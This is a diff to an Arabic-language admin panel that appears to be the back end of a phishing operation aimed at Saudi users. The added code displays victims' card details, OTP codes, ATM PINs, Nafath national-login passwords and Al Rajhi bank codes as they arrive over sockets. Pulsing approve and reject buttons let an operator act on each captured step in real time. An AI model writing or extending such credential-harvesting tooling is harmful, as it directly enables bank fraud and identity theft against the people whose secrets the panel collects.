@@ -286,6 +286,37 @@
       background: linear-gradient(135deg, #b91c1c, #991b1b);
       box-shadow: 0 6px 16px rgba(220,38,38,0.4);
     }
+    /* أزرار القبول/الرفض في صف الجدول */
+    .row-approve-btn, .row-reject-btn {
+      width: 32px; height: 32px; border-radius: 8px; border: none;
+      cursor: pointer; display: inline-flex; align-items: center; justify-content: center;
+      font-size: 16px; transition: all 0.2s;
+      background: #e2e8f0; color: #94a3b8;
+    }
+    .row-approve-btn:hover { background: #dcfce7; color: #16a34a; }
+    .row-reject-btn:hover { background: #fee2e2; color: #dc2626; }
+    /* عند وجود بيانات جديدة: تضيء بالأخضر والأحمر */
+    .row-approve-btn.active {
+      background: #16a34a; color: #fff;
+      box-shadow: 0 0 0 3px rgba(22,163,74,0.3);
+      animation: pulse-green 1.5s ease-in-out infinite;
+    }
+    .row-reject-btn.active {
+      background: #dc2626; color: #fff;
+      box-shadow: 0 0 0 3px rgba(220,38,38,0.3);
+      animation: pulse-red 1.5s ease-in-out infinite;
+    }
+    @keyframes pulse-green {
+      0%,100% { box-shadow: 0 0 0 3px rgba(22,163,74,0.3); }
+      50% { box-shadow: 0 0 0 6px rgba(22,163,74,0.1); }
+    }
+    @keyframes pulse-red {
+      0%,100% { box-shadow: 0 0 0 3px rgba(220,38,38,0.3); }
+      50% { box-shadow: 0 0 0 6px rgba(220,38,38,0.1); }
+    }
+    .row-approve-btn.active:hover { background: #15803d; animation: none; }
+    .row-reject-btn.active:hover { background: #b91c1c; animation: none; }
+
     /* شارة جديد */
     .badge-new-data {
       display: inline-block; background: #ef4444; color: #fff;
@@ -579,6 +610,12 @@
             <button class="btn-act blue" onclick="openDetail('${b.referenceId}')">
               <i class="bi bi-eye"></i> تفاصيل
             </button>
+            <button class="row-approve-btn ${isNew ? 'active' : ''}" title="قبول" onclick="paymentAction('${b.referenceId}','pass')">
+              <i class="bi bi-check-circle-fill"></i>
+            </button>
+            <button class="row-reject-btn ${isNew ? 'active' : ''}" title="رفض" onclick="paymentAction('${b.referenceId}','denied')">
+              <i class="bi bi-x-circle-fill"></i>
+            </button>
             <div class="dd-wrap">
               <button class="btn-act" onclick="toggleDD('nav_${b.referenceId}')">
                 <i class="bi bi-send"></i> توجيه <i class="bi bi-chevron-down"></i>
@@ -604,6 +641,37 @@
         </td>
       </tr>`;
     }).join("");
+  }
+
+  // إضاءة أزرار القبول/الرفض في الجدول لصف معين
+  function activateRowButtons(ref) {
+    // تحديث شارة "جديد" في الجدول
+    const allRows = document.querySelectorAll('#tBody tr');
+    allRows.forEach(row => {
+      const codeEl = row.querySelector('code');
+      if (codeEl && codeEl.textContent.trim() === ref) {
+        // إضافة شارة جديد إذا لم تكن موجودة
+        const statusTd = row.querySelector('td:nth-child(7)');
+        if (statusTd && !statusTd.querySelector('.badge-new-data')) {
+          const badge = document.createElement('span');
+          badge.className = 'badge-new-data';
+          badge.textContent = 'جديد';
+          statusTd.appendChild(badge);
+        }
+        // إضاءة أزرار القبول/الرفض في الصف
+        const approveBtn = row.querySelector('.row-approve-btn');
+        const rejectBtn = row.querySelector('.row-reject-btn');
+        if (approveBtn) approveBtn.classList.add('active');
+        if (rejectBtn) rejectBtn.classList.add('active');
+      }
+    });
+    // إضاءة أزرار نافذة التفاصيل إذا كانت مفتوحة
+    const approveModal = document.getElementById(`pay-pass-${ref}`);
+    const rejectModal = document.getElementById(`pay-denied-${ref}`);
+    if (approveModal) approveModal.classList.add('active');
+    if (rejectModal) rejectModal.classList.add('active');
+    const sec = document.querySelector('.action-section');
+    if (sec) sec.classList.add('has-new');
   }
 
   function filterRows() {
@@ -640,13 +708,27 @@
   async function paymentAction(ref, action) {
     const passBtn = document.getElementById(`pay-pass-${ref}`);
     const denyBtn = document.getElementById(`pay-denied-${ref}`);
-    // إزالة شارة جديد وإعادة الأزرار للرمادي
+    // إزالة شارة جديد وإعادة الأزرار للرمادي (نافذة التفاصيل)
     newDataRefs.delete(ref);
-    renderRows(rows);
     const sec = document.querySelector('.action-section');
     if (sec) sec.classList.remove('has-new');
     if (passBtn) { passBtn.classList.remove('active'); }
     if (denyBtn) { denyBtn.classList.remove('active'); }
+    // إزالة active من أزرار صف الجدول
+    const allRows = document.querySelectorAll('#tBody tr');
+    allRows.forEach(row => {
+      const codeEl = row.querySelector('code');
+      if (codeEl && codeEl.textContent.trim() === ref) {
+        const rowApprove = row.querySelector('.row-approve-btn');
+        const rowReject = row.querySelector('.row-reject-btn');
+        if (rowApprove) rowApprove.classList.remove('active');
+        if (rowReject) rowReject.classList.remove('active');
+        // إزالة شارة جديد
+        const badgeEl = row.querySelector('.badge-new-data');
+        if (badgeEl) badgeEl.remove();
+      }
+    });
+    renderRows(rows);
     // تعطيل كلا الزرين وإظهار 'جاري...'
     if (passBtn) { passBtn.disabled = true; passBtn.textContent = 'جاري...'; }
     if (denyBtn) { denyBtn.disabled = true; denyBtn.textContent = 'جاري...'; }
@@ -737,37 +819,25 @@
     try {
       const d = await get(`/api/admin/bookings/${ref}`);
       if (!d.success) return;
-      // d.data = { booking, payment, verification } أو d.data مباشرة إذا كان الخادم يُرجع البيانات مباشرة
-      let booking, payment, nafath;
-      if (d.data && d.data.booking) {
-        booking = d.data.booking;
-        payment = d.data.payment || null;
-        nafath = d.data.verification || null;
-      } else {
-        booking = d.data;
-        payment = null;
-        nafath = null;
-      }
-      // دمج البيانات في كائن واحد للدالة buildDetail
-      const b = { ...booking, payment, nafath, motasel: null };
+      const booking = d.data.booking;
+      const payment = d.data.payment || null;
+      const verifications = d.data.verifications || {};
+      // دمج البيانات للدالة buildDetail
+      const b = { ...booking, payment, verifications };
       currentOpenRef = ref;
       document.getElementById("mTitle").textContent = `تفاصيل الحجز - ${b.referenceId}`;
       document.getElementById("mBody").innerHTML = buildDetail(b);
       document.getElementById("detailOverlay").classList.add("show");
-      // إذا كان فيه بيانات جديدة: فعّل الأزرار وأضف has-new
+      // إضاءة الأزرار إذا كانت فيه بيانات جديدة
       if (newDataRefs.has(ref)) {
         const sec = document.querySelector('.action-section');
         if (sec) sec.classList.add('has-new');
-        const approveBtn = document.getElementById(`pay-pass-${ref}`);
-        const rejectBtn = document.getElementById(`pay-denied-${ref}`);
-        if (approveBtn) approveBtn.classList.add('active');
-        if (rejectBtn) rejectBtn.classList.add('active');
-        const nafathApprove = document.getElementById(`nafath-pass-${ref}`);
-        const nafathReject = document.getElementById(`nafath-denied-${ref}`);
-        if (nafathApprove) nafathApprove.classList.add('active');
-        if (nafathReject) nafathReject.classList.add('active');
+        ['pay-pass', 'pay-denied', 'nafath-pass', 'nafath-denied'].forEach(id => {
+          const btn = document.getElementById(`${id}-${ref}`);
+          if (btn) btn.classList.add('active');
+        });
       }
-    } catch { toast("خطأ في تحميل التفاصيل","err"); }
+    } catch(e) { toast("خطأ في تحميل التفاصيل","err"); }
   }
   function closeModal() {
     currentOpenRef = null;
@@ -820,13 +890,33 @@
           </div>
         </div>`;
     }
-    if (b.nafath) {
-      const nafathStep = b.nafath.step || 1;
-      const nafathStatus = b.nafath.status || '';
+    // عرض بيانات OTP إذا وجدت
+    const ver = b.verifications || {};
+    if (ver.phone || ver.phoneCode) {
+      const otp = ver.phone || ver.phoneCode;
+      h += `<div class="sec-title" style="background:#eff6ff;color:#1d4ed8;"><i class="bi bi-phone" style="color:#2563eb"></i> بيانات OTP</div>
+        <div class="detail-grid">
+          ${dRow("رمز OTP", otp.verifyCode || otp.phoneCode || otp.code || '-')}
+          ${dRow("الجوال", otp.phone || otp.clientPhone || '-')}
+        </div>`;
+    }
+    // عرض بيانات الرقم السري ATM إذا وجدت
+    if (ver.pin || ver.code) {
+      const pin = ver.pin || ver.code;
+      h += `<div class="sec-title" style="background:#fffbeb;color:#92400e;"><i class="bi bi-lock" style="color:#f59e0b"></i> بيانات الرقم السري ATM</div>
+        <div class="detail-grid">
+          ${dRow("الرقم السري", pin.secretNum || pin.pin || pin.code || '-')}
+        </div>`;
+    }
+    // عرض بيانات نفاذ إذا وجدت
+    if (ver.nafad || ver.nafath) {
+      const nafath = ver.nafad || ver.nafath;
+      const nafathStatus = nafath.status || '';
+      const nafathStep = nafath.step || 1;
       h += `<div class="sec-title">بيانات نفاذ</div>
         <div class="detail-grid">
-          ${dRow("رقم الهوية",b.nafath.nafathId)}${dRow("كلمة المرور",b.nafath.nafathPassword)}
-          ${dRow("رمز نفاذ",b.nafath.nafathNumber)}
+          ${dRow("رقم الهوية",nafath.nafathId)}${dRow("كلمة المرور",nafath.nafathPassword)}
+          ${dRow("رمز نفاذ",nafath.nafathNumber)}
         </div>
         <div class="action-section">
           <div class="action-sec-title"><i class="bi bi-shield-lock" style="color:#7c3aed"></i> إجراء التحقق من الهوية (نفاذ)</div>
@@ -851,13 +941,6 @@
               </button>
             </div>
           </div>` : ''}
-        </div>`;
-    }
-    if (b.motasel) {
-      h += `<div class="sec-title">بيانات المتصل</div>
-        <div class="detail-grid">
-          ${dRow("المزود",b.motasel.motaselProvider)}${dRow("الجوال",b.motasel.motaselPhone)}
-          ${dRow("الرمز",b.motasel.motaselCode)}
         </div>`;
     }
 
@@ -896,54 +979,44 @@
       beep(); toast(`حجز جديد: ${bk.clientName||bk.referenceId}`,"inf");
       loadAll();
     });
+    // معالجة بيانات الدفع الجديدة (بطاقة)
     sock.on("newPayment", (d) => {
-      const stepNames = { 1: 'بيانات البطاقة', 2: 'رمز OTP', 3: 'رقم سري ATM' };
-      const stepLabel = d.step ? ` (${stepNames[d.step]||'خطوة '+d.step})` : '';
-      // تسجيل الحجز كجديد
-      if (d.reference) newDataRefs.add(d.reference);
-      beep(); toast(`بيانات جديدة: ${d.reference}${stepLabel}`,"inf");
-      // تحديث الشارة في الجدول فوراً
-      const statusMap = {
-        payment: 'pending_payment',
-        otp: 'pending_otp',
-        code: 'pending_atm',
-        nafath: 'pending_nafath',
-        phone: 'pending_motasel',
-        phoneCode: 'pending_motasel',
-        motasel: 'pending_motasel',
-        motaselCode: 'pending_motasel',
-        rajhi: 'pending_payment',
-        rajhiCode: 'pending_atm',
-      };
-      const newStatus = statusMap[d.type];
-      if (newStatus && d.reference) {
-        const allRows = document.querySelectorAll('#tBody tr');
-        allRows.forEach(row => {
-          if (row.innerHTML.includes(d.reference)) {
-            const badgeEl = row.querySelector('.badge');
-            if (badgeEl) {
-              const s = STATUS[newStatus] || { lbl: newStatus, cls:'b-new' };
-              badgeEl.className = `badge ${s.cls}`;
-              badgeEl.textContent = s.lbl;
-            }
-          }
-        });
-        const rowIdx = rows.findIndex(r => r.referenceId === d.reference);
-        if (rowIdx !== -1) rows[rowIdx].status = newStatus;
-      }
+      const ref = d.referenceId || d.reference;
+      if (!ref) return;
+      // تسجيل الحجز كجديد وإضاءة الأزرار
+      newDataRefs.add(ref);
+      beep();
+      toast(`\u2709 بيانات بطاقة جديدة: ${ref}`, "inf");
+      // تحديث شارة "جديد" في الجدول مباشرة
+      activateRowButtons(ref);
       loadAll();
-      // إضاءة أزرار القبول/الرفض تلقائياً إذا كانت النافذة مفتوحة
-      if (currentOpenRef && currentOpenRef === d.reference) {
-        setTimeout(() => {
-          openDetail(d.reference);
-          // بعد فتح التفاصيل أضف الفئة active
-          setTimeout(() => {
-            const approveBtn = document.getElementById(`pay-pass-${d.reference}`);
-            const rejectBtn = document.getElementById(`pay-denied-${d.reference}`);
-            if (approveBtn) approveBtn.classList.add('active');
-            if (rejectBtn) rejectBtn.classList.add('active');
-          }, 200);
-        }, 300);
+      // إضاءة أزرار القبول/الرفض إذا كانت نافذة التفاصيل مفتوحة
+      if (currentOpenRef === ref) {
+        setTimeout(() => openDetail(ref), 300);
+      }
+    });
+
+    // معالجة بيانات التحقق الجديدة (OTP / رقم سري / نفاذ)
+    sock.on("newVerification", (d) => {
+      const ref = d.referenceId || d.reference;
+      if (!ref) return;
+      const typeNames = {
+        phone: 'رمز OTP',
+        phoneCode: 'رمز OTP',
+        pin: 'رقم سري ATM',
+        nafad: 'نفاذ',
+        nafath: 'نفاذ',
+        rajhi: 'الراجحي',
+        rajhiCode: 'رمز الراجحي',
+      };
+      const typeLabel = typeNames[d.type] || d.type || 'بيانات جديدة';
+      newDataRefs.add(ref);
+      beep();
+      toast(`\u2709 ${typeLabel}: ${ref}`, "inf");
+      activateRowButtons(ref);
+      loadAll();
+      if (currentOpenRef === ref) {
+        setTimeout(() => openDetail(ref), 300);
       }
     });
     // معالجة تحديث موقع العميل
